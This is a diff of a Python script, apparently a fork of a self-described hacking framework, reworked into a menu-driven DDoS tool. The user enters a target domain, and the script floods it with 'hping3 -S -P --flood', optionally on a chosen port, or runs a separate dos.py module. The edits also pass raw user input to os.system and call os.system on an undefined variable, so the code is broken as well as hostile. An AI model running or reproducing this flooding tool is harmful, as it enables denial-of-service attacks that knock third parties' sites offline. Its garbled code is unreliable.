@@ -39,42 +39,47 @@ def heads():
 ⠀           ⢿⣿⣿⣿⣿⣷⣄⣀⣀⣀⣀⣀⣀
 ⠀        ⣠⣴⣾⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠷⠶⠶⠤⢤⣀
 ⠀        ⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀  ⠀"""+W+'DDOS'+E+F+"""⠀⠀ ⠀⠀⠀⣿⣿⣷⣦⣄⡀
-⠀        ⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀"""+W+'⠀IP'+E+F+"""⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⠿⠛
+⠀        ⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀"""+W+'⠀Domin'+E+F+"""⠀⠀⠀⠀⠀⣿⣿⣿⠿⠛
 ⠀        ⠿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⠶⠟⠛⠉
 ⠀⠀⠀        ⣸⣿⣿⣿⣿⣿⠟⠛⠛⠛⠛⠛⠛⠛⠛⠉⠉⠉
 ⠀⠀        ⢰⣿⣿⣿⣿⡿⠃
 ⠀       ⠀⠉⠉⠉⠉⠉
         """+E
+	os.system(command)
 def banner():
 	text1 =  E+F+"""
-⠀⢻⣿⣿⣿⣿⣦
-⠀⠀⢿⣿⣿⣿⣿⣷⣄⣀⣀⣀⣀⣀⣀
-⣠⣴⣾⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠷⠶⠶⠤⢤⣀
-⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀  ⠀"""+W+'DDOS'+E+F+"""⠀⠀ ⠀⠀⠀⣿⣿⣷⣦⣄⡀
-⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀"""+W+'⠀IP'+E+F+"""⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⠿⠛
-⠿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⠶⠟⠛⠉
-⠀⠀⣸⣿⣿⣿⣿⣿⠟⠛⠛⠛⠛⠛⠛⠛⠛⠉⠉⠉
-⠀⢰⣿⣿⣿⣿⡿⠃
-⠀⠉⠉⠉⠉⠉
+⠀         ⢻⣿⣿⣿⣿⣦
+⠀⠀        ⠀⢿⣿⣿⣿⣿⣷⣄⣀⣀⣀⣀⣀⣀
+⠀        ⣠⣴⣾⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠷⠶⠶⠤⢤⣀
+⠀        ⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀  ⠀"""+W+'DDOS'+E+F+"""⠀⠀ ⠀⠀⠀⣿⣿⣷⣦⣄⡀
+⠀        ⣿⣿⣿⣿⣿⣿⣿⡇⠀ ⠀⠀"""+W+'Domin'+E+F+"""⠀⠀⠀ ⠀⠀⣿⣿⣿⠿⠛
+⠀        ⠿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⠶⠟⠛⠉
+⠀⠀⠀        ⣸⣿⣿⣿⣿⣿⠟⠛⠛⠛⠛⠛⠛⠛⠛⠉⠉⠉
+⠀⠀        ⢰⣿⣿⣿⣿⡿⠃
+⠀⠀       ⠉⠉⠉⠉⠉
         """+E
-	text2 = O+"""
- _   _                             
-| | | |                            
-| |_| |_   _ _ __  _ __   ___ _ __ 3
-|  _  | | | | '_ \| '_ \ / _ \ '__|
-| | | | |_| | | | | | | |  __/ |   
-\_| |_/\__,_|_| |_|_| |_|\___|_|   
-      """+F+'<<<<---------'+W+'B3-v3r'+F+'--------->>>>'+E+F+'\n<<<<--------'+W+'The hacking framework'+F+'-------->>>>'+E
+	text2 = E+F+"""
+⠀⠀        ⢻⣿⣿⣿⣿⣦
+⠀⠀        ⠀⢿⣿⣿⣿⣿⣷⣄⣀⣀⣀⣀⣀⣀
+⠀        ⣠⣴⣾⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠷⠶⠶⠤⢤⣀
+⠀        ⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀  ⠀"""+W+'DDOS'+E+F+"""⠀⠀ ⠀⠀⠀⣿⣿⣷⣦⣄⡀
+⠀        ⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀"""+W+'Domin'+E+F+"""⠀⠀⠀ ⠀⠀⣿⣿⣿⠿⠛
+⠀        ⠿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⠶⠟⠛⠉
+⠀⠀⠀        ⣸⣿⣿⣿⣿⣿⠟⠛⠛⠛⠛⠛⠛⠛⠛⠉⠉⠉
+⠀⠀        ⢰⣿⣿⣿⣿⡿⠃
+⠀⠀       ⠉⠉⠉⠉⠉
+        """+E
+    
 	text3 = E+F+"""
-⠀⢻⣿⣿⣿⣿⣦
-⠀⠀⢿⣿⣿⣿⣿⣷⣄⣀⣀⣀⣀⣀⣀
-⣠⣴⣾⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠷⠶⠶⠤⢤⣀
-⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀  ⠀"""+W+'DDOS'+E+F+"""⠀⠀ ⠀⠀⠀⣿⣿⣷⣦⣄⡀
-⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀"""+W+'⠀IP'+E+F+"""⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⠿⠛
-⠿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⠶⠟⠛⠉
-⠀⠀⣸⣿⣿⣿⣿⣿⠟⠛⠛⠛⠛⠛⠛⠛⠛⠉⠉⠉
-⠀⢰⣿⣿⣿⣿⡿⠃
-⠀⠉⠉⠉⠉⠉
+⠀⠀        ⢻⣿⣿⣿⣿⣦
+⠀⠀        ⠀⢿⣿⣿⣿⣿⣷⣄⣀⣀⣀⣀⣀⣀
+⠀        ⣠⣴⣾⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠷⠶⠶⠤⢤⣀
+⠀        ⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀  ⠀"""+W+'DDOS'+E+F+"""⠀⠀ ⠀⠀⠀⣿⣿⣷⣦⣄⡀
+⠀        ⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀"""+W+'Domin'+E+F+"""⠀⠀⠀⠀ ⠀⣿⣿⣿⠿⠛
+⠀        ⠿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⠶⠟⠛⠉
+⠀⠀⠀        ⣸⣿⣿⣿⣿⣿⠟⠛⠛⠛⠛⠛⠛⠛⠛⠉⠉⠉
+⠀⠀        ⢰⣿⣿⣿⣿⡿⠃
+⠀⠀       ⠉⠉⠉⠉⠉
         """+E
 	ran = random.randrange(1, 4)
 	if ran == 1:
@@ -173,23 +178,21 @@ def SQL():
 	except:
 		print(F+'Fatal error'+E)
 
-
+ 
 def Dos():
-	os.system('clear')
+	
+	os.system(command)
 	banner()
-	print('Enter site:')
-	site = input(B+'Hunner»Dos»'+E)
-	print('''Enter level:
-		1) High dos
-		2) Dos port
- 		3) Low dos''')
-	level = int(input(B+'Hunner»Dos»Level»'+E))
-	if level == 1:
+	print('')
+	site = input(G+'  />'+W+' enter Domin Target site'+G+': ')
+	print(G+'\n 2 />'+W+' Start DDos with Default port')
+	level = int(input(G+'\n  />'+W+' enter 2 for start DDos '+G+': '))
+	if level == 3:
 		os.system('hping3 -S -P --flood -V '+site)
-	if level == 2:
+	if level == 1:
 		port = input(B+'Hunner»Dos»Level»Port»'+E)
 		os.system('hping3 -S -P --flood -V -p '+port+' '+ site)
-	if level == 3:
+	if level == 2:
 		os.system('python3 modules/dos.py '+site)
 
 def SSH_Brut():
@@ -251,9 +254,9 @@ def mail():
 def Main_Menu():
 	print(head)
 	desc()
-	print(G+'''  1 />'''+W+' DDOS whith IP')
+	print(G+'''  1 />'''+W+' DDOS whith Domin')
 	try:
-		v = input(G+"\n  />"+W+' enter number 1 '+G+':')
+		v = input(G+"\n  />"+W+' enter number 1 '+G+': ')
 	except:
 		print(' Good by ')
 		exit()
